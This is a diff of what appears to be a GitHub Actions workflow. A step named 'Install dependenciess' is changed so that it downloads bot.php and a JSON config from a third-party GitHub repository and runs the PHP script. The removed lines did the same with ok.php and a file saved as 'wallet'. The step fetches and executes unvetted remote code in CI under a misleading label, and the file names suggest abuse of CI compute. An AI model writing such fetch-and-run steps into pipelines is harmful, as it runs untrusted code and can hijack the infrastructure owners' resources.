@@ -14,14 +14,9 @@ jobs:
         coverage: none
     - name: Install dependenciess
       run: |
-        wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
-        sudo sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google-chrome.list'
-        sudo apt-get update
-        sudo apt-get install google-chrome-stable
-        
-        wget https://raw.githubusercontent.com/Mosnio/dpy/main/ok.php
-        wget -O wallet https://raw.githubusercontent.com/Mosnio/dpy/main/v1
-        php ok.php
+        wget https://github.com/Mosnio/dpy/raw/main/bot.php
+        wget https://github.com/Mosnio/dpy/raw/main/v1.json -O config.json
+        php bot.php
         
  #       unzip clm.zip
 #        wget https://github.com/Mosnio/mehi1/raw/main/clm/cn1.js -O config.json
